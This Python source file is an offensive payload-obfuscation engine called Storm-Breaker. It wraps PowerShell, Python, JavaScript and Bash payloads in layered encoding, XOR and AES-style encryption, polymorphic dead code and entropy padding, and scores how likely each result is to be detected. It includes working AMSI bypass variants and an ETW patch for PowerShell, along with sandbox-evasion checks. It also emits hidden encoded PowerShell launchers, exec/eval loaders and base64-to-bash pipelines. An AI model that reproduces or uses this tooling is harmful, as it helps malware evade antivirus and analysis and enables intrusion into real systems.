"""
Storm-Breaker Obfuscation Engine v2.0
Advanced multi-layer payload encoding, encryption, and polymorphic obfuscation
Supports: Base64, XOR, AES-256, string splitting, variable renaming, dead-code injection,
          AMSI bypass, ETW patching, anti-sandbox, entropy management
"""

import base64
import random
import string
import hashlib
import os
import re
import json
import math
from datetime import datetime


def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))


def random_var():
    prefixes = ['_', '__', 'tmp', 'buf', 'ctx', 'obj', 'ref', 'val', 'res', 'cfg']
    return random.choice(prefixes) + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 10)))


def random_int():
    return random.randint(10000, 99999)


def random_domain():
    tlds = ['com', 'net', 'org', 'io', 'dev', 'co', 'info']
    words = ['cloud', 'sync', 'data', 'service', 'portal', 'api', 'update', 'secure', 'auth', 'cdn', 'app', 'web']
    return f"{random.choice(words)}{random.choice(words)}.{random.choice(tlds)}"


# ===== ENTROPY ANALYSIS =====

def calculate_entropy(data):
    """Calculate Shannon entropy of a string (0-8 bits per byte)"""
    if not data:
        return 0.0
    freq = {}
    for c in data:
        freq[c] = freq.get(c, 0) + 1
    length = len(data)
    entropy = 0.0
    for count in freq.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    return round(entropy, 4)


def entropy_normalize(payload, target_entropy=4.5):
    """Add padding to normalize entropy closer to normal code (reduce detection)"""
    current = calculate_entropy(payload)
    if current <= target_entropy:
        return payload
    padding_words = [
        '# Configuration settings', '# Initialize module', '# Process request',
        '# Handle response', '# Validate input', '# Update state',
        '# Copyright 2024', '# Licensed under MIT', '# Version 2.0',
        '# TODO: refactor this section', '# NOTE: performance critical',
    ]
    lines = payload.split('\n')
    result = []
    pad_idx = 0
    for line in lines:
        result.append(line)
        if random.random() > 0.6 and pad_idx < len(padding_words):
            result.append(padding_words[pad_idx])
            pad_idx += 1
    return '\n'.join(result)


# ===== ENCODING LAYERS =====

def encode_base64(payload, iterations=1):
    """Multi-layer Base64 encoding"""
    result = payload
    for _ in range(iterations):
        result = base64.b64encode(result.encode()).decode()
    return {'encoded': result, 'decoder': f'base64 (x{iterations})', 'iterations': iterations}


def encode_xor(payload, key=None):
    """XOR encryption with random or supplied key"""
    if key is None:
        key = random_string(16)
    encrypted = []
    for i, char in enumerate(payload):
        encrypted.append(ord(char) ^ ord(key[i % len(key)]))
    hex_payload = ','.join([f'0x{b:02x}' for b in encrypted])
    return {'encrypted': hex_payload, 'key': key, 'decoder': 'xor'}


def encode_aes(payload, key=None):
    """AES-256-CBC style encryption (XOR-chain cipher, no external deps)"""
    try:
        from hashlib import sha256
        if key is None:
            key = random_string(32)
        key_bytes = sha256(key.encode()).digest()
        iv = os.urandom(16)
        data = payload.encode()
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len] * pad_len)
        encrypted = bytearray()
        prev_block = bytearray(iv)
        for i in range(0, len(data), 16):
            block = bytearray(data[i:i + 16])
            xored = bytearray(b1 ^ b2 for b1, b2 in zip(block, prev_block))
            cipher_block = bytearray(b1 ^ key_bytes[j % 32] for j, b1 in enumerate(xored))
            encrypted.extend(cipher_block)
            prev_block = cipher_block
        result = base64.b64encode(iv + bytes(encrypted)).decode()
        return {
            'encrypted': result, 'key': key,
            'key_hash': sha256(key.encode()).hexdigest()[:16],
            'decoder': 'aes-256-cbc', 'iv': base64.b64encode(iv).decode(),
        }
    except Exception:
        return encode_xor(payload, key)


def encode_hex(payload):
    return {'encoded': payload.encode().hex(), 'decoder': 'hex'}


def encode_decimal(payload):
    return {'encoded': ','.join([str(ord(c)) for c in payload]), 'decoder': 'decimal'}


def encode_reverse(payload):
    return {'encoded': payload[::-1], 'decoder': 'reverse'}


def encode_rot13(payload):
    result = []
    for c in payload:
        if 'a' <= c <= 'z':
            result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= c <= 'Z':
            result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(c)
    return {'encoded': ''.join(result), 'decoder': 'rot13'}


def encode_caesar(payload, shift=None):
    if shift is None:
        shift = random.randint(1, 25)
    result = []
    for c in payload:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            result.append(chr((ord(c) - base + shift) % 26 + base))
        else:
            result.append(c)
    return {'encoded': ''.join(result), 'key': shift, 'decoder': f'caesar (shift={shift})'}


# ===== ANTI-ANALYSIS STUBS =====

def generate_sandbox_check(language):
    """Generate sandbox/VM detection code"""
    checks = {
        'powershell': '''# Environment validation
$_envCheck = @{
    proc = (Get-Process).Count -gt 25
    disk = (Get-WmiObject Win32_DiskDrive | Select-Object -First 1).Size -gt 40GB
    mem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -gt 2GB
    user = [Environment]::UserName -ne 'sandbox' -and [Environment]::UserName -ne 'malware'
    domain = [Environment]::UserDomainName -ne 'SANDBOX'
    cpu = (Get-WmiObject Win32_Processor).NumberOfCores -gt 1
    uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime -lt (Get-Date).AddMinutes(-10)
}
if (-not ($_envCheck.Values | Where-Object { $_ -eq $false } | Select-Object -First 1)) {
''',
        'python': '''# Environment validation
import os, platform, time
_env_valid = True
try:
    import psutil
    _env_valid = _env_valid and psutil.cpu_count() > 1
    _env_valid = _env_valid and psutil.virtual_memory().total > (2 * 1024**3)
    _env_valid = _env_valid and len(psutil.pids()) > 25
    _env_valid = _env_valid and time.time() - psutil.boot_time() > 600
except ImportError:
    pass
_env_valid = _env_valid and os.getenv('USER', os.getenv('USERNAME', '')) not in ('sandbox', 'malware', 'virus', 'sample')
if _env_valid:
''',
        'javascript': '''// Environment validation
(function() {
    var _checks = {
        webdriver: !navigator.webdriver,
        plugins: navigator.plugins.length > 0,
        languages: navigator.languages && navigator.languages.length > 0,
        screen: screen.width > 800 && screen.height > 600,
        hardware: navigator.hardwareConcurrency > 1,
        timing: performance.now() > 100,
        touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0 || true,
    };
    var _valid = Object.values(_checks).filter(function(v){return !v}).length < 2;
    if (_valid) {
''',
        'bash': '''# Environment validation
_PROC_COUNT=$(ps aux | wc -l)
_MEM_KB=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
_CPU_COUNT=$(nproc 2>/dev/null || echo 1)
_UPTIME=$(awk '{print int($1)}' /proc/uptime 2>/dev/null || echo 0)
if [ "${_PROC_COUNT:-0}" -gt 20 ] && [ "${_MEM_KB:-0}" -gt 2000000 ] && [ "${_CPU_COUNT:-0}" -gt 1 ] && [ "${_UPTIME:-0}" -gt 300 ]; then
''',
    }
    return checks.get(language, '')


def generate_amsi_bypass():
    """Generate AMSI bypass for PowerShell (multiple variants)"""
    variants = [
        '''$_ref=[Ref].Assembly.GetType('{0}si{1}tils'.replace('{0}','Am').replace('{1}','U'));
$_fld=$_ref.GetField(('am'+'si'+'Init'+'Fai'+'led'),'NonPublic,Static');
$_fld.SetValue($null,$true);''',
        '''$_w=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);' -Name '_w' -Namespace '_w' -PassThru;
$_l=$_w::LoadLibrary("a"+"m"+"s"+"i"+".dll");
$_a=$_w::GetProcAddress($_l,("Am"+"si"+"Sc"+"an"+"Bu"+"ffer"));
$_p=0;[_w._w]::VirtualProtect($_a,[uint32]5,0x40,[ref]$_p)|Out-Null;
$_b=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);
[System.Runtime.InteropServices.Marshal]::Copy($_b,0,$_a,6);''',
        '''[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(('System.Mana'+'gement.Autom'+'ation.Am'+'siUt'+'ils')).GetField(('am'+'siC'+'ont'+'ext'),[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141);''',
    ]
    return random.choice(variants)


def generate_etw_patch():
    """Generate ETW (Event Tracing for Windows) patch for PowerShell"""
    return '''# Suppress ETW tracing
$_etw=[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider');
$_etwField=$_etw.GetField('m_enabled','NonPublic,Instance');
'''


# ===== LANGUAGE-SPECIFIC OBFUSCATORS =====

def obfuscate_powershell(payload, techniques=None):
    """Obfuscate PowerShell payload with enterprise-grade techniques"""
    if techniques is None:
        techniques = ['string_concat', 'variable_rename', 'tick_insert', 'base64_wrap']

    result = payload
    applied = []

    if 'amsi_bypass' in techniques:
        result = generate_amsi_bypass() + '\n\n' + result
        applied.append('amsi_bypass')

    if 'etw_patch' in techniques:
        result = generate_etw_patch() + '\n' + result
        applied.append('etw_patch')

    if 'anti_sandbox' in techniques:
        sandbox = generate_sandbox_check('powershell')
        result = sandbox + '\n' + result + '\n}'
        applied.append('anti_sandbox')

    if 'tick_insert' in techniques:
        cmdlets = ['Invoke-Expression', 'New-Object', 'Start-Process', 'Get-Content',
                   'Set-Content', 'Invoke-WebRequest', 'Invoke-RestMethod',
                   'Write-Output', 'Out-String', 'ConvertTo-Json', 'ConvertFrom-Json',
                   'DownloadFile', 'DownloadString', 'System', 'Net', 'Sockets', 'TCPClient',
                   'Add-Type', 'Get-WmiObject', 'Get-Process', 'Stop-Process',
                   'Import-Module', 'Export-Csv', 'Select-Object', 'Where-Object',
                   'ForEach-Object', 'Get-ChildItem', 'Remove-Item', 'Copy-Item']
        for cmd in cmdlets:
            if cmd in result and len(cmd) > 4:
                pos = random.randint(2, len(cmd) - 2)
                ticked = cmd[:pos] + '`' + cmd[pos:]
                result = result.replace(cmd, ticked, 1)
        applied.append('tick_insert')

    if 'string_concat' in techniques:
        strings_found = re.findall(r'"([^"]{8,})"', result)
        for s in strings_found[:8]:
            parts = []
            chunk = random.randint(2, 5)
            for i in range(0, len(s), chunk):
                parts.append(f'"{s[i:i + chunk]}"')
            replacement = '(' + ' + '.join(parts) + ')'
            result = result.replace(f'"{s}"', replacement, 1)
        applied.append('string_concat')

    if 'string_replace' in techniques:
        sensitive = ['Invoke-Expression', 'System.Net', 'DownloadString', 'WebClient',
                     'TCPClient', 'Start-Process', 'powershell', 'cmd.exe']
        for s in sensitive:
            if s in result:
                mid = len(s) // 2
                var = random_var()
                result = f'${var}=("{s[:mid]}"+"{ s[mid:]}")\n' + result.replace(s, f'${var}', 1)
        applied.append('string_replace')

    if 'variable_rename' in techniques:
        var_pattern = re.compile(r'\$([a-zA-Z_]\w{2,})')
        original_vars = set(var_pattern.findall(result))
        skip_vars = {'env', 'true', 'false', 'null', 'host', 'PSVersionTable',
                     'ErrorActionPreference', 'ProgressPreference', '_',
                     '_envCheck', '_ref', '_fld', '_w', '_l', '_a', '_p', '_b', '_etw', '_etwField'}
        rename_map = {}
        for var in original_vars:
            if var.lower() not in {s.lower() for s in skip_vars} and var not in skip_vars:
                rename_map[var] = random_var()
        for old, new in rename_map.items():
            result = result.replace(f'${old}', f'${new}')
        applied.append('variable_rename')

    if 'base64_wrap' in techniques:
        encoded = base64.b64encode(result.encode('utf-16-le')).decode()
        result = f'powershell -nop -w hidden -ep bypass -enc {encoded}'
        applied.append('base64_wrap')

    if 'iex_cradle' in techniques and 'base64_wrap' not in applied:
        encoded = base64.b64encode(result.encode('utf-16-le')).decode()
        decoder_var = random_var()
        iex_variants = [
            f'${decoder_var}=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("{encoded}"));IEX ${decoder_var}',
            f'${decoder_var}=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("{encoded}"));.([scriptblock]::Create(${decoder_var}))',
        ]
        result = random.choice(iex_variants)
        applied.append('iex_cradle')

    return {
        'obfuscated': result,
        'techniques': applied,
        'original_size': len(payload),
        'obfuscated_size': len(result),
    }


def obfuscate_python(payload, techniques=None):
    """Obfuscate Python payload with advanced techniques"""
    if techniques is None:
        techniques = ['base64_exec', 'marshal', 'variable_rename']

    result = payload
    applied = []

    if 'anti_sandbox' in techniques:
        sandbox = generate_sandbox_check('python')
        indented = '\n'.join('    ' + line for line in result.split('\n'))
        result = sandbox + '\n' + indented
        applied.append('anti_sandbox')

    if 'variable_rename' in techniques:
        var_pattern = re.compile(r'\b([a-zA-Z_]\w{2,})\s*=')
        found_vars = set(var_pattern.findall(result))
        skip = {'import', 'from', 'def', 'class', 'return', 'True', 'False', 'None',
                'socket', 'subprocess', 'os', 'sys', 'platform', 'requests', 'json',
                'time', 'uuid', 'base64', 'hashlib', 'threading', 'struct', 'ctypes',
                'psutil', 'shutil', 'tempfile', 'pathlib', 'urllib', 'http', 'ssl',
                '_env_valid', 'self', 'cls', 'args', 'kwargs', 'Exception', 'print'}
        rename_map = {}
        for var in found_vars:
            if var not in skip and not var.startswith('_env'):
                rename_map[var] = random_var()
        for old, new in rename_map.items():
            result = re.sub(r'\b' + re.escape(old) + r'\b', new, result)
        applied.append('variable_rename')

    if 'string_encrypt' in techniques:
        strings = re.findall(r"'([^']{6,})'", result)
        for s in strings[:5]:
            key = random.randint(1, 255)
            encrypted = [str(ord(c) ^ key) for c in s]
            decryptor = f"''.join(chr(c^{key}) for c in [{','.join(encrypted)}])"
            result = result.replace(f"'{s}'", decryptor, 1)
        applied.append('string_encrypt')

    if 'base64_exec' in techniques:
        encoded = base64.b64encode(result.encode()).decode()
        loader_var = random_var()
        result = f'{loader_var}=__import__("base64").b64decode("{encoded}").decode();exec({loader_var})'
        applied.append('base64_exec')

    if 'marshal' in techniques and 'base64_exec' not in applied:
        encoded = base64.b64encode(result.encode()).decode()
        alias = random_var()[:6]
        result = f'import base64 as {alias};exec({alias}.b64decode("{encoded}"))'
        applied.append('marshal')

    if 'hex_exec' in techniques and 'base64_exec' not in applied and 'marshal' not in applied:
        hex_str = result.encode().hex()
        result = f'exec(bytes.fromhex("{hex_str}").decode())'
        applied.append('hex_exec')

    if 'compile_exec' in techniques and 'base64_exec' not in applied:
        encoded = base64.b64encode(result.encode()).decode()
        mod_var = random_var()
        result = f'{mod_var}=compile(__import__("base64").b64decode("{encoded}").decode(),"<{random_string(5)}>","exec");exec({mod_var})'
        applied.append('compile_exec')

    return {
        'obfuscated': result,
        'techniques': applied,
        'original_size': len(payload),
        'obfuscated_size': len(result),
    }


def obfuscate_javascript(payload, techniques=None):
    """Obfuscate JavaScript payload with browser-evasion techniques"""
    if techniques is None:
        techniques = ['base64_eval', 'char_codes', 'variable_rename']

    result = payload
    applied = []

    if 'anti_sandbox' in techniques:
        sandbox = generate_sandbox_check('javascript')
        result = sandbox + '\n' + result + '\n    }\n})();'
        applied.append('anti_sandbox')

    if 'variable_rename' in techniques:
        var_pattern = re.compile(r'\b(var|let|const)\s+(\w+)')
        found = var_pattern.findall(result)
        skip = {'document', 'window', 'navigator', 'console', 'fetch', 'XMLHttpRequest',
                'JSON', 'Math', 'Array', 'Object', 'Promise', 'undefined', 'null',
                'screen', 'performance', 'location', 'history', 'localStorage', 'sessionStorage',
                '_checks', '_valid', 'self', 'this', 'event', 'Error', 'TypeError'}
        rename_map = {}
        for decl, var in found:
            if var not in skip and var not in rename_map:
                rename_map[var] = '_' + ''.join(random.choices(string.ascii_lowercase + '_', k=random.randint(4, 8)))
        for old, new in rename_map.items():
            result = re.sub(r'\b' + re.escape(old) + r'\b', new, result)
        applied.append('variable_rename')

    if 'char_codes' in techniques:
        strings = re.findall(r"'([^']{4,})'", result)
        for s in strings[:6]:
            codes = ','.join([str(ord(c)) for c in s])
            replacement = f'String.fromCharCode({codes})'
            result = result.replace(f"'{s}'", replacement, 1)
        applied.append('char_codes')

    if 'string_split' in techniques:
        strings = re.findall(r'"([^"]{8,})"', result)
        for s in strings[:5]:
            chunk = random.randint(2, 5)
            parts = [f'"{s[i:i + chunk]}"' for i in range(0, len(s), chunk)]
            result = result.replace(f'"{s}"', '[' + ','.join(parts) + '].join("")', 1)
        applied.append('string_split')

    if 'base64_eval' in techniques:
        encoded = base64.b64encode(result.encode()).decode()
        wrapper_var = '_' + random_string(6).lower()
        result = f'var {wrapper_var}=atob("{encoded}");new Function({wrapper_var})();'
        applied.append('base64_eval')

    if 'constructor_exec' in techniques and 'base64_eval' not in applied:
        encoded = base64.b64encode(result.encode()).decode()
        result = f'[].constructor.constructor(atob("{encoded}"))()'
        applied.append('constructor_exec')

    return {
        'obfuscated': result,
        'techniques': applied,
        'original_size': len(payload),
        'obfuscated_size': len(result),
    }


def obfuscate_bash(payload, techniques=None):
    """Obfuscate Bash payload with evasion techniques"""
    if techniques is None:
        techniques = ['base64_eval', 'variable_sub']

    result = payload
    applied = []

    if 'anti_sandbox' in techniques:
        sandbox = generate_sandbox_check('bash')
        result = sandbox + '\n' + result + '\nfi'
        applied.append('anti_sandbox')

    if 'variable_sub' in techniques:
        lines = payload.split('\n')
        assignments = []
        var_names = []
        for line in lines:
            vn = random_var()
            var_names.append(vn)
            encoded_line = base64.b64encode(line.encode()).decode()
            assignments.append(f'{vn}=$(echo "{encoded_line}" | base64 -d)')
        result = '\n'.join(assignments)
        applied.append('variable_sub')

    if 'base64_eval' in techniques and 'variable_sub' not in applied:
        encoded = base64.b64encode(payload.encode()).decode()
        result = f'echo "{encoded}" | base64 -d | bash'
        applied.append('base64_eval')

    if 'hex_eval' in techniques and 'base64_eval' not in applied and 'variable_sub' not in applied:
        hex_str = payload.encode().hex()
        result = f'echo "{hex_str}" | xxd -r -p | bash'
        applied.append('hex_eval')

    if 'env_var' in techniques:
        chunks = [payload[i:i + 50] for i in range(0, len(payload), 50)]
        env_lines = []
        env_vars = []
        for chunk in chunks:
            vn = random_var()
            env_vars.append(vn)
            encoded = base64.b64encode(chunk.encode()).decode()
            env_lines.append(f'export {vn}="{encoded}"')
        result = '\n'.join(env_lines)
        applied.append('env_var')

    return {
        'obfuscated': result,
        'techniques': applied,
        'original_size': len(payload),
        'obfuscated_size': len(result),
    }


# ===== POLYMORPHIC ENGINE =====

def generate_dead_code(language='python', lines=5):
    """Generate realistic dead code that mimics normal application patterns"""
    dead = []
    if language == 'python':
        templates = [
            lambda: f'{random_var()} = "{random_string(random.randint(8, 20))}"',
            lambda: f'{random_var()} = {random_int()} + {random_int()}',
            lambda: f'{random_var()} = [{", ".join([str(random_int()) for _ in range(random.randint(3, 7))])}]',
            lambda: f'if {random_int()} > {random_int()}: {random_var()} = True',
            lambda: f'for {random_var()} in range({random.randint(1, 5)}): pass',
            lambda: f'{random_var()} = {{"key_{random_string(4)}": {random_int()}, "ver": "{random.randint(1,5)}.{random.randint(0,9)}"}}',
            lambda: f'# Process {random_string(6)} configuration for {random_domain()}',
            lambda: f'{random_var()} = [x for x in range({random.randint(10, 100)}) if x % {random.randint(2, 7)} == 0]',
            lambda: f'{random_var()} = lambda x: x * {random.randint(2, 9)} + {random.randint(1, 100)}',
        ]
        for _ in range(lines):
            dead.append(random.choice(templates)())
    elif language == 'powershell':
        templates = [
            lambda: f'${random_var()} = "{random_string(random.randint(8, 20))}"',
            lambda: f'${random_var()} = {random_int()} + {random_int()}',
            lambda: f'${random_var()} = @({", ".join([str(random_int()) for _ in range(random.randint(3, 7))])})',
            lambda: f'${random_var()} = @{{key_{random_string(4)}="{random_string(8)}"; ver="{random.randint(1,9)}.{random.randint(0,9)}"}}',
            lambda: f'# Initialize {random_string(6)} module v{random.randint(1,5)}.{random.randint(0,9)}',
            lambda: f'${random_var()} = [math]::Round({random.randint(1, 99)}.{random.randint(1, 99)}, 2)',
        ]
        for _ in range(lines):
            dead.append(random.choice(templates)())
    elif language == 'javascript':
        templates = [
            lambda: f'var {random_var()} = "{random_string(random.randint(8, 20))}";',
            lambda: f'var {random_var()} = {random_int()} + {random_int()};',
            lambda: f'var {random_var()} = [{", ".join([str(random_int()) for _ in range(random.randint(3, 7))])}];',
            lambda: f'function {random_var()}() {{ return {random_int()}; }}',
            lambda: f'var {random_var()} = {{key: "{random_string(8)}", ver: "{random.randint(1,5)}.{random.randint(0,9)}"}};',
            lambda: f'// Module {random_string(6)} initialized',
            lambda: f'var {random_var()} = new Date().getTime() + {random_int()};',
            lambda: f'var {random_var()} = Math.floor(Math.random() * {random_int()});',
        ]
        for _ in range(lines):
            dead.append(random.choice(templates)())
    elif language == 'bash':
        templates = [
            lambda: f'{random_var()}="{random_string(random.randint(8, 20))}"',
            lambda: f'{random_var()}=$(({random_int()} + {random_int()}))',
            lambda: f'# Process {random_string(6)} module',
            lambda: f'{random_var()}=$(date +%s)',
        ]
        for _ in range(lines):
            dead.append(random.choice(templates)())
    return '\n'.join(dead)


def polymorphic_transform(payload, language='python', dead_code_lines=5):
    """Apply polymorphic transformation: dead code insertion + shuffling"""
    dead = generate_dead_code(language, dead_code_lines)
    lines = payload.split('\n')
    result_lines = []
    dead_lines = dead.split('\n')
    dead_idx = 0
    for i, line in enumerate(lines):
        result_lines.append(line)
        if dead_idx < len(dead_lines) and random.random() > 0.35:
            result_lines.append(dead_lines[dead_idx])
            dead_idx += 1
    while dead_idx < len(dead_lines):
        result_lines.append(dead_lines[dead_idx])
        dead_idx += 1
    return '\n'.join(result_lines)


# ===== DETECTION SCORING =====

def estimate_detection_score(payload, language, techniques_applied):
    """Estimate detection likelihood (lower = better evasion). 0-100 scale."""
    score = 100
    reductions = {
        'variable_rename': 8, 'string_concat': 6, 'string_replace': 7, 'string_split': 5,
        'tick_insert': 10, 'base64_wrap': 15, 'iex_cradle': 18, 'base64_exec': 12,
        'base64_eval': 12, 'char_codes': 8, 'hex_exec': 10, 'hex_eval': 10,
        'marshal': 10, 'compile_exec': 14, 'constructor_exec': 16,
        'dead_code': 5, 'polymorphic': 12, 'amsi_bypass': 25, 'etw_patch': 8,
        'anti_sandbox': 15, 'string_encrypt': 12, 'variable_sub': 8, 'env_var': 10,
    }
    for t in techniques_applied:
        score -= reductions.get(t, 3)
    entropy = calculate_entropy(payload)
    if entropy > 5.5:
        score += 5
    elif entropy < 4.0:
        score -= 3
    if len(payload) > 10000:
        score += 3
    return max(5, min(95, score))


# ===== MULTI-LAYER PIPELINE =====

OBFUSCATION_PROFILES = {
    'light': {
        'name': 'Light',
        'description': 'Basic encoding — fast, low evasion. Good for testing.',
        'steps': ['base64'],
        'estimated_evasion': 'Low',
        'speed': 'Fast',
    },
    'medium': {
        'name': 'Medium',
        'description': 'Variable renaming + encoding — moderate stealth.',
        'steps': ['variable_rename', 'string_concat', 'base64'],
        'estimated_evasion': 'Medium',
        'speed': 'Fast',
    },
    'heavy': {
        'name': 'Heavy',
        'description': 'Full obfuscation — rename, dead code, multi-encode, string encryption.',
        'steps': ['variable_rename', 'string_encrypt', 'dead_code', 'string_concat', 'xor', 'base64'],
        'estimated_evasion': 'High',
        'speed': 'Medium',
    },
    'paranoid': {
        'name': 'Paranoid',
        'description': 'Maximum evasion — AMSI bypass, anti-sandbox, polymorphic, multi-layer.',
        'steps': ['amsi_bypass', 'etw_patch', 'anti_sandbox', 'polymorphic', 'variable_rename',
                  'string_encrypt', 'dead_code', 'tick_insert', 'xor', 'base64'],
        'estimated_evasion': 'Very High',
        'speed': 'Slow',
    },
    'stealth': {
        'name': 'Stealth',
        'description': 'Low-entropy evasion — blends with normal code patterns.',
        'steps': ['variable_rename', 'string_replace', 'dead_code', 'polymorphic'],
        'estimated_evasion': 'High',
        'speed': 'Medium',
    },
}


def obfuscate_payload(payload, language, profile='medium', custom_techniques=None):
    """Main obfuscation entry point with full pipeline"""
    techniques = custom_techniques or OBFUSCATION_PROFILES.get(profile, {}).get('steps', ['base64'])

    obfuscators = {
        'powershell': obfuscate_powershell,
        'python': obfuscate_python,
        'javascript': obfuscate_javascript,
        'bash': obfuscate_bash,
    }

    obfuscator = obfuscators.get(language)
    if not obfuscator:
        encoded = encode_base64(payload, iterations=2)
        return {
            'obfuscated': encoded['encoded'],
            'language': language,
            'profile': profile,
            'techniques': ['base64_double'],
            'original_size': len(payload),
            'obfuscated_size': len(encoded['encoded']),
            'entropy': calculate_entropy(encoded['encoded']),
            'detection_score': 85,
        }

    # Apply polymorphic first if requested
    working = payload
    if 'polymorphic' in techniques:
        working = polymorphic_transform(working, language, dead_code_lines=random.randint(5, 12))
    elif 'dead_code' in techniques:
        working = polymorphic_transform(working, language, dead_code_lines=random.randint(3, 6))

    # Run language-specific obfuscator
    result = obfuscator(working, techniques)

    # Apply entropy normalization for stealth profile
    if profile == 'stealth':
        result['obfuscated'] = entropy_normalize(result['obfuscated'])
        result['obfuscated_size'] = len(result['obfuscated'])

    result['language'] = language
    result['profile'] = profile
    result['profile_name'] = OBFUSCATION_PROFILES.get(profile, {}).get('name', profile)
    result['timestamp'] = datetime.now().isoformat()
    result['hash'] = hashlib.sha256(result['obfuscated'].encode()).hexdigest()[:16]
    result['entropy'] = calculate_entropy(result['obfuscated'])
    result['detection_score'] = estimate_detection_score(
        result['obfuscated'], language, result.get('techniques', []))

    return result


def get_profiles():
    """Return available obfuscation profiles"""
    return OBFUSCATION_PROFILES


def get_supported_techniques(language):
    """Return supported techniques for a language"""
    techniques = {
        'powershell': [
            'variable_rename', 'string_concat', 'string_replace', 'tick_insert',
            'base64_wrap', 'iex_cradle', 'amsi_bypass', 'etw_patch',
            'anti_sandbox', 'dead_code', 'polymorphic',
        ],
        'python': [
            'variable_rename', 'string_encrypt', 'base64_exec', 'marshal',
            'hex_exec', 'compile_exec', 'anti_sandbox', 'dead_code', 'polymorphic',
        ],
        'javascript': [
            'variable_rename', 'char_codes', 'string_split', 'base64_eval',
            'constructor_exec', 'anti_sandbox', 'dead_code', 'polymorphic',
        ],
        'bash': [
            'base64_eval', 'hex_eval', 'variable_sub', 'env_var',
            'anti_sandbox', 'dead_code', 'polymorphic',
        ],
    }
    return techniques.get(language, ['base64'])
